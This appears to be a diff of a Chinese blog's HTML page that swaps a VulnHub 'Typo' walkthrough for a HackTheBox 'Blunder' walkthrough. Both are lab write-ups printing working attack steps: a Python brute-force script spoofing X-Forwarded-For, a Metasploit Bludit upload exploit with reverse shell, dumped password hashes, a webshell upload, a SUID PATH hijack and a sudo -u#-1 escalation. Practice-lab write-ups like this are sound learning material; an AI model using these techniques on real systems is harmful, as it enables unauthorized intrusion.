@@ -4,14 +4,16 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="Typo, Web h**k Python aling">
+    <meta name="keywords" content="blunder, Web h**k Python aling">
     <meta name="baidu-site-verification" content="fmlEuI34ir">
     <meta name="google-site-verification" content="yCy2azpds5XSuGZvis6OuA-XIGF5GuGpYRAaGfD6o48">
     <meta name="360-site-verification" content="b7c11a830ef90fd1464ad6206bb7b6e7">
-    <meta name="description" content="又被打击了，我还是很菜啊，cao ！
-root@kali:~# nmap 192.168.232.151
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-30 04:05 EDT
-Nma">
+    <meta name="description" content="
+  nmap
+
+kali@kali:~$ nmap 10.10.10.191
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-20 23:53 EDT
+Nmap scan report">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -19,7 +21,7 @@ Nma">
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>Typo | 道士信佛</title>
+    <title>blunder | 道士信佛</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -286,7 +288,7 @@ Nma">
 <script src="/libs/cryptojs/crypto-js.min.js"></script>
 <script>
     (function() {
-        let pwd = '';
+        let pwd = '5952a047314592f472fae6bbf2231cb9d7df0c6abd80eec42c1c7b679624e552';
         if (pwd && pwd.length > 0) {
             if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
                 alert('密码错误，将返回主页！');
@@ -299,13 +301,13 @@ Nma">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/20.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        Typo
+                        blunder
                     </div>
                 </div>
             </div>
@@ -416,8 +418,8 @@ Nma">
                     
                     <div class="article-tag">
                         
-                        <a href="/tags/vulnhub/" target="_blank">
-                            <span class="chip bg-color">vulnhub</span>
+                        <a href="/tags/hackTheBox/" target="_blank">
+                            <span class="chip bg-color">hackTheBox</span>
                         </a>
                         
                     </div>
@@ -440,7 +442,7 @@ Nma">
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-05-30
+                    2020-06-21
                 </div>
 
                 <div class="post-author info-break-policy">
@@ -454,14 +456,14 @@ Nma">
                 
                 <div class="info-break-policy">
                     <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    830
+                    694
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    4 分
+                    3 分
                 </div>
                 
                 
@@ -472,123 +474,160 @@ Nma">
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>又被打击了，我还是很菜啊，cao ！</p>
-<pre class="line-numbers language-shell"><code class="language-shell">root@kali:~# nmap 192.168.232.151
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-30 04:05 EDT
-Nmap scan report for bogon (192.168.232.151)
-Host is up (0.00088s latency).
-Not shown: 995 closed ports
-PORT     STATE SERVICE
-22/tcp   open  ssh
-80/tcp   open  http
-8000/tcp open  http-alt
-8080/tcp open  http-proxy
-8081/tcp open  blackice-icecap
-MAC Address: 00:0C:29:D2:A6:DE (VMware)
-Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
-root@kali:~# <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>用目录扫描一个端口一个端口的扫，扫出来两个可能有用的界面</p>
-<p><img src="1.png" alt></p>
-<p><img src="2.png" alt></p>
-<p>typo3 后台界面弱口令试了一下进不去。对phpmyadmin后台做弱口令测试 root:root 进入后台，到这里似乎一起都很美好，然后网上到处找getshell方法，都不行！</p>
-<p><img src="3.jpg" alt></p>
-<p>真的让人悲伤，自信心再一次收到了打击……无奈只好翻阅大佬的  <strong><a href="https://www.hacknos.com/typo-1-walkthrough-vulnhub/" target="_blank" rel="noopener">博客</a></strong>  ，跟着大佬的步骤做下去</p>
-<p><img src="4.png" alt></p>
-<p>原来将这里的用户密码替换掉就可以了，我当时还看过这表，由于不知道是个啥加密就没管，简直菜的不行~</p>
-<p><img src="5.jpg" alt></p>
-<p>有多学了一种加密方式，奇怪的知识又增加了  <strong><a href="https://argon2.online/" target="_blank" rel="noopener">Argon2 Hash </a></strong>  利用这个网站可以生成一个自定义的字符串的加密结果，我加密的的字符是“aling”</p>
-<p><img src="6.png" alt></p>
-<p>将加密结果复制下来替换掉admin的password字段，登陆typo3 后台</p>
-<p><img src="7.png" alt></p>
-<p>上传木马：Settings -&gt; Configure options -&gt; Backend[BE] 找到下图字段，把php后缀的限制删除，就可以上传.php文件了</p>
-<p><img src="8.png" alt></p>
-<p>上传木马发弹 shell，利用 apache2-restart 提权，又是涨芝士的一天~</p>
-<pre class="line-numbers language-shell"><code class="language-shell">root@kali:~# nc -lp 6666
-Linux typo 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64 GNU/Linux
- 14:14:58 up  3:36,  0 users,  load average: 0.00, 0.01, 0.00
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-/bin/sh: 0: can't access tty; job control turned off
-$ 
-$ python3 -c 'import pty;pty.spawn("/bin/bash")'
-www-data@typo:/$ 
-www-data@typo:/$ find -perm -4000 -print 2>/dev/null   # 查找具有suid权限的2进制文件
-find -perm -4000 -print 2>/dev/null
-./usr/bin/mount
-./usr/bin/newgrp
-./usr/bin/chfn
-./usr/bin/su
-./usr/bin/gpasswd
-./usr/bin/chsh
-./usr/bin/umount
-./usr/bin/passwd
-./usr/lib/dbus-1.0/dbus-daemon-launch-helper
-./usr/lib/eject/dmcrypt-get-device
-./usr/lib/openssh/ssh-keysign
-./usr/local/bin/apache2-restart     # 可以提权的文件
-./usr/local/bin/phpunit     # 也可以用于提权，没试过
-www-data@typo:/$ apache2-restart
-apache2-restart
-www-data@typo:/$ 
-www-data@typo:/$ whereis apache2-restart
-whereis apache2-restart
-apache2-restart: /usr/local/bin/apache2-restart
-www-data@typo:/$ strings /usr/local/bin/apache2-restart
-strings /usr/local/bin/apache2-restart
-/lib64/ld-linux-x86-64.so.2
-5q;Xq
-__gmon_start__
-libc.so.6
-setresgid
-setresuid
-system
-__libc_start_main
-GLIBC_2.2.5
-fff.
-fffff.
-l$ L
-t$(L
-|$0H
-service apache2 start       # service 会使用root权限
-GCC: (Debian 4.4.5-8) 4.4.5
-.symtab
-.strtab
-.shstrtab
-.interp
-...
-www-data@typo:/$ 
-www-data@typo:/$ cd /tmp
-cd /tmp
-www-data@typo:/tmp$ 
-www-data@typo:/tmp$ echo "/bin/bash" > service
-echo "/bin/bash" > service
-www-data@typo:/tmp$ 
-www-data@typo:/tmp$ ls
-ls
-service
-www-data@typo:/tmp$ chmod a+x service
-chmod a+x service
-www-data@typo:/tmp$ ls -lh
-ls -lh
-total 4.0K
--rwxrwxrwx 1 www-data www-data 10 May 30 14:20 service
-www-data@typo:/tmp$ 
-www-data@typo:/tmp$ export PATH=/tmp/:$PATH
-export PATH=/tmp/:$PATH
-www-data@typo:/tmp$ 
-www-data@typo:/tmp$ echo $PATH
-echo $PATH
-/tmp/:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
-www-data@typo:/tmp$ 
-www-data@typo:/tmp$ apache2-restart
-apache2-restart
-root@typo:/tmp# 
-root@typo:/tmp# whoami
-whoami
-root
-root@typo:/tmp# <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><strong>总结？</strong></p>
-<p>正常人能写总结吗？写在最后的话能是心里话吗？</p>
+                <blockquote>
+<p>  nmap</p>
+</blockquote>
+<pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~$ nmap 10.10.10.191
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-20 23:53 EDT
+Nmap scan report for bogon (10.10.10.191)
+Host is up (0.24s latency).
+Not shown: 998 filtered ports
+PORT   STATE  SERVICE
+21/tcp closed ftp
+80/tcp open   http
+
+Nmap done: 1 IP address (1 host up) scanned in 15.28 seconds
+kali@kali:~$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<blockquote>
+<p>  dirb 扫到一个后台和 一个有用的 txt文件</p>
+</blockquote>
+<p><img src="image-20200621115614009.png" alt></p>
+<p><img src="image-20200621120343835.png" alt></p>
+<p>猜测获取到了用户名</p>
+<blockquote>
+<p>  cewl 生成字典</p>
+</blockquote>
+<pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~$ cewl http://10.10.10.191 -w blunder.txt
+CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>抓包发现有一个token会随着表单一起提交</p>
+<p>写爆破脚本，远程搭建了一个 bludit 对登陆成功的数据包做分析，登陆成功的数据包会返回一个 Loction 字段</p>
+<p><img src="image-20200621120918628.png" alt> </p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> re
+
+url <span class="token operator">=</span> <span class="token string">'http://10.10.10.191/admin/login'</span>
+username <span class="token operator">=</span> <span class="token string">'fergus'</span>
+
+<span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'blunder.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+    passwd <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#print(passwd)</span>
+<span class="token keyword">for</span> p <span class="token keyword">in</span> passwd<span class="token punctuation">:</span>
+    password <span class="token operator">=</span> p<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span> 
+    header <span class="token operator">=</span> <span class="token punctuation">{</span>
+        <span class="token string">'X-Forwarded-For'</span><span class="token punctuation">:</span>password<span class="token punctuation">,</span>
+        <span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0'</span><span class="token punctuation">,</span>
+        <span class="token string">'Referer'</span><span class="token punctuation">:</span> <span class="token string">'http://10.10.10.191/admin/login'</span>
+    <span class="token punctuation">}</span>   
+    session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    get_res <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+    csrf_token <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">'name="tokenCSRF".+?value="(.+?)"'</span><span class="token punctuation">,</span>get_res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+    <span class="token comment" spellcheck="true">#print(csrf_token)</span>
+    data <span class="token operator">=</span> <span class="token punctuation">{</span>
+            <span class="token string">'username'</span><span class="token punctuation">:</span>username<span class="token punctuation">,</span>
+            <span class="token string">'password'</span><span class="token punctuation">:</span>password<span class="token punctuation">,</span>
+            <span class="token string">'tokenCSRF'</span><span class="token punctuation">:</span>csrf_token<span class="token punctuation">,</span>
+            <span class="token string">'save'</span><span class="token punctuation">:</span><span class="token string">''</span>
+    <span class="token punctuation">}</span>
+    <span class="token comment" spellcheck="true">#print(data,end='')</span>
+    post_res <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>allow_redirects <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">)</span>
+    <span class="token comment" spellcheck="true">#print(post_res.headers)</span>
+    <span class="token keyword">if</span> <span class="token string">'Location'</span> <span class="token keyword">in</span> post_res<span class="token punctuation">.</span>headers<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token string">'\033[1;33m password:\033[0m'</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span>
+        <span class="token keyword">break</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">' trying...'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="image-20200621122319295.png" alt></p>
+<p>有了用户名和密码，直接用 msf getshell</p>
+<pre class="line-numbers language-shell"><code class="language-shell">msf5 > search bludit
+Matching Modules
+================
+
+   #  Name                                          Disclosure Date  Rank       Check  Description
+   -  ----                                          ---------------  ----       -----  -----------
+   0  exploit/linux/http/bludit_upload_images_exec  2019-09-07       excellent  Yes    Bludit Directory Traversal Image File Upload Vulnerability
+
+msf5 > use exploit/linux/http/bludit_upload_images_exec
+msf5 exploit(linux/http/bludit_upload_images_exec) > options
+Module options (exploit/linux/http/bludit_upload_images_exec):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   BLUDITPASS  RolandDeschain   yes       The password for Bludit
+   BLUDITUSER  fergus           yes       The username for Bludit
+   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS      10.10.10.191     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT       80               yes       The target port (TCP)
+   SSL         false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI                    yes       The base path for Bludit
+   VHOST                        no        HTTP server virtual host
+Payload options (php/meterpreter/reverse_tcp):
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.15.38      yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Bludit v3.9.2
+msf5 exploit(linux/http/bludit_upload_images_exec) ><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-shell"><code class="language-shell"># 在一个目录下找到用户名和密码
+www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php
+cat users.php
+<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
+{
+    "admin": {
+        "nickname": "Hugo",
+        "firstName": "Hugo",
+        "lastName": "",
+        "role": "User",
+        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
+        "email": "",
+        "registered": "2019-11-27 07:40:55",
+        "tokenRemember": "",
+        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
+        "tokenAuthTTL": "2009-03-15 14:00",
+        "twitter": "",
+        "facebook": "",
+        "instagram": "",
+        "codepen": "",
+        "linkedin": "",
+        "github": "",
+        "gitlab": ""}
+}
+www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<blockquote>
+<p>  hash-identifier 探测加密</p>
+</blockquote>
+<p><img src="image-20200621123229784.png" alt></p>
+<p><strong><a href="![image-20200621123734126](C:\Users\ALing\AppData\Roaming\Typora\typora-user-images\image-20200621123734126.png)">解密</a></strong></p>
+<p><img src="image-20200621123807516.png" alt></p>
+<blockquote>
+<p>  切换用户提权</p>
+</blockquote>
+<pre class="line-numbers language-shell"><code class="language-shell">www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ su hugo
+su hugo
+Password: Password120
+hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cd
+cd
+hugo@blunder:~$ sudo -l
+sudo -l
+Password: Password120
+Matching Defaults entries for hugo on blunder:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User hugo may run the following commands on blunder:
+    (ALL, !root) /bin/bash
+hugo@blunder:~$ 
+sud 
+hugo@blunder:sudo -u#-1 /bin/bash
+sudo -u#-1 /bin/bash
+root@blunder:/home/hugo# id
+id
+uid=0(root) gid=1001(hugo) groups=1001(hugo)
+root@blunder:/home/hugo# <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
             </div>
             <hr />
@@ -747,9 +786,9 @@ root@typo:/tmp# <span aria-hidden="true" class="line-numbers-rows"><span></span>
             <br/>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
                   property="dct:title" rel="dct:type">
-                    《Typo》
+                    《blunder》
                 </span> 由
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2020/05/30/vulnhub-typo/" property="cc:attributionName"
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2020/06/21/blunder/" property="cc:attributionName"
                rel="cc:attributionURL">
                 ALing
             </a> 采用
@@ -1051,77 +1090,29 @@ root@typo:/tmp# <span aria-hidden="true" class="line-numbers-rows"><span></span>
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2020/06/06/vulnhub-cryptobank/">
+                <a href="/2020/06/21/blunder/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="cryptobank">
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="blunder">
                         
-                        <span class="card-title">cryptobank</span>
+                        <span class="card-title">blunder</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            sql注入、401、phpinfo+file_upload、revsocks代理、solr提权
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-06-06
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fa fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/渗透测试/" class="post-category" target="_blank">
-                                    渗透测试
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/vulnhub/" target="_blank">
-                        <span class="chip bg-color">vulnhub</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2020/05/26/vulnhub-sumo/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="sumo">
-                        
-                        <span class="card-title">sumo</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            破壳漏洞
+                            wfuzz、爆破后台、msf、sudo
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-05-26
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-06-21
                             </span>
                         <span class="publish-author">
                             
@@ -1135,11 +1126,61 @@ root@typo:/tmp# <span aria-hidden="true" class="line-numbers-rows"><span></span>
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/vulnhub/" target="_blank">
-                        <span class="chip bg-color">vulnhub</span>
+                    <a href="/tags/hackTheBox/" target="_blank">
+                        <span class="chip bg-color">hackTheBox</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/06/19/shell-ge-shi-hua-shu-chu/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="shell 格式化输出">
+                        
+                        <span class="card-title">shell 格式化输出</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            格式化输出
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-06-19
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/编程语言/" class="post-category" target="_blank">
+                                    编程语言
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/shell/" target="_blank">
+                        <span class="chip bg-color">shell</span>
                     </a>
                     
                 </div>
@@ -1285,6 +1326,25 @@ root@typo:/tmp# <span aria-hidden="true" class="line-numbers-rows"><span></span>
     
 
 </main>
+
+
+<script src="https://cdn.bootcss.com/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+    MathJax.Hub.Config({
+        tex2jax: {inlineMath: [['$', '$'], ['\(', '\)']]}
+    });
+</script>
+
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+<script type="text/javascript" src="/libs/codeBlock/clipboard.min.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
 
 
     <footer class="page-footer bg-color">
